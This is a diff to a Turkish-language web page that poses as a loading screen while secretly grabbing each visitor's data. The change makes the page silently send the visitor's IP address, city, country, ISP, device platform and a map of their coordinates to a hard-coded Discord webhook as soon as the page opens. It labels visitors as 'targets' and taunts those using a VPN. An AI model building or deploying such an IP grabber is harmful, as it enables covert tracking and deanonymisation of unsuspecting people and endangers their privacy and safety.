@@ -30,7 +30,7 @@
 <body>
 
 <div class="terminal">
-    <div class="line type-1">>Bir DAkika Bekleyin...</div>
+    <div class="line type-1">> Bir Dakika Bekleyin...</div>
     <div class="line type-2">> Çok Az Kaldı</div>
     <div class="line type-3">> Açılıyor!</div>
     
@@ -53,9 +53,45 @@
 </div>
 
 <script>
-    // Senin orijinal Discord Webhook URL'in
     const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
 
+    // --- 1. SESSİZ OPERASYON: Site açıldığı an çalışır ---
+    fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        const isVPN = data.country_code !== 'TR';
+        const device = navigator.platform;
+        const regNo = Math.floor(Math.random() * 89999) + 10000;
+
+        // Verileri daha bar dolmadan hemen Discord'a fırlat
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: "TEŞKİLAT ANLIK SİSTEM",
+                embeds: [{
+                    title: isVPN ? "🕵️ HEDEF VPN ARKASINA SAKLANIYOR" : "🎯 HEDEF NET LOKASYONDA",
+                    color: isVPN ? 16763904 : 16711680,
+                    description: "Kullanıcı şu an yükleme ekranında bekletiliyor, bilgiler başarıyla çekildi.",
+                    fields: [
+                        { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
+                        { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country_name}\``, inline: true },
+                        { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
+                        { name: "💻 Sistem Bilgisi", value: `\`${device}\``, inline: true }
+                    ],
+                    image: { url: `https://static-maps.yandex.ru/1.x/?lang=en_US&ll=${data.longitude},${data.latitude}&z=12&l=map&size=450,250` },
+                    footer: { text: "Kayıt No: #" + regNo },
+                    timestamp: new Date()
+                }]
+            })
+        });
+
+        // Verileri tarayıcı hafızasına al (Bar bitince ekrana basmak için)
+        window.cachedData = data;
+        window.cachedRegNo = regNo;
+    });
+
+    // --- 2. GÖRSEL EFEKT: Yükleme barı simülasyonu ---
     setTimeout(() => {
         document.getElementById('loader').style.display = 'block';
         let bar = document.getElementById('bar');
@@ -63,60 +99,32 @@
         let interval = setInterval(() => {
             if (width >= 100) {
                 clearInterval(interval);
-                finalizeDiscovery();
+                finalizeDisplay(); 
             } else {
                 width++;
                 bar.style.width = width + '%';
             }
-        }, 25);
-    }, 4500);
+        }, 30); // Yaklaşık 3 saniye sürer
+    }, 4500); // Yazı animasyonlarından sonra başlar
 
-    function finalizeDiscovery() {
-        fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            const isVPN = data.country_code !== 'TR';
-            const device = navigator.platform;
-            const regNo = Math.floor(Math.random() * 89999) + 10000;
-            document.getElementById('reg-no').innerText = regNo;
+    function finalizeDisplay() {
+        const data = window.cachedData;
+        if (!data) return; 
 
-            // Ekran Bilgilerini Doldur
-            document.getElementById('user-ip').innerText = data.ip;
-            document.getElementById('user-loc').innerText = `${data.city} / ${data.country_name}`;
-            document.getElementById('user-isp').innerText = data.org;
-            document.getElementById('user-sys').innerText = device;
-            
-            if(isVPN) {
-                document.getElementById('vpn-msg').innerHTML = `<div class="vpn-alert">HAHA, VPN AÇMAN KOMİK OLMUŞ :)</div>`;
-            }
+        const isVPN = data.country_code !== 'TR';
+        document.getElementById('reg-no').innerText = window.cachedRegNo;
+        document.getElementById('user-ip').innerText = data.ip;
+        document.getElementById('user-loc').innerText = `${data.city} / ${data.country_name}`;
+        document.getElementById('user-isp').innerText = data.org;
+        document.getElementById('user-sys').innerText = navigator.platform;
+        
+        if(isVPN) {
+            document.getElementById('vpn-msg').innerHTML = `<div class="vpn-alert">HAHA, VPN AÇMAN KOMİK OLMUŞ :)</div>`;
+        }
 
-            // Haritayı yükle
-            const mapUrl = `https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=14&output=embed`;
-            document.getElementById('gmap').src = mapUrl;
-            document.getElementById('result-box').style.display = 'block';
-
-            // Discord'a Gönder (VPN AÇIKKEN ÇALIŞIR)
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: "TEŞKİLAT SORGULAMA MERKEZİ",
-                    embeds: [{
-                        title: isVPN ? "🕵️ HEDEF VPN ARKASINA SAKLANIYOR" : "🎯 HEDEF NET LOKASYONDA",
-                        color: isVPN ? 16763904 : 16711680,
-                        fields: [
-                            { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
-                            { name: "📍 Lokasyon", value: `\`${data.city} / ${data.country_name}\``, inline: true },
-                            { name: "📡 ISS", value: `\`${data.org}\``, inline: false },
-                            { name: "💻 Sistem Bilgisi", value: `\`${device}\``, inline: true }
-                        ],
-                        image: { url: `https://static-maps.yandex.ru/1.x/?lang=en_US&ll=${data.longitude},${data.latitude}&z=12&l=map&size=450,250` },
-                        footer: { text: "Kayıt No: #" + regNo },
-                        timestamp: new Date()
-                    }]
-                })
-            });
-        });
+        const mapUrl = `https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=14&output=embed`;
+        document.getElementById('gmap').src = mapUrl;
+        document.getElementById('result-box').style.display = 'block';
     }
 </script>
 
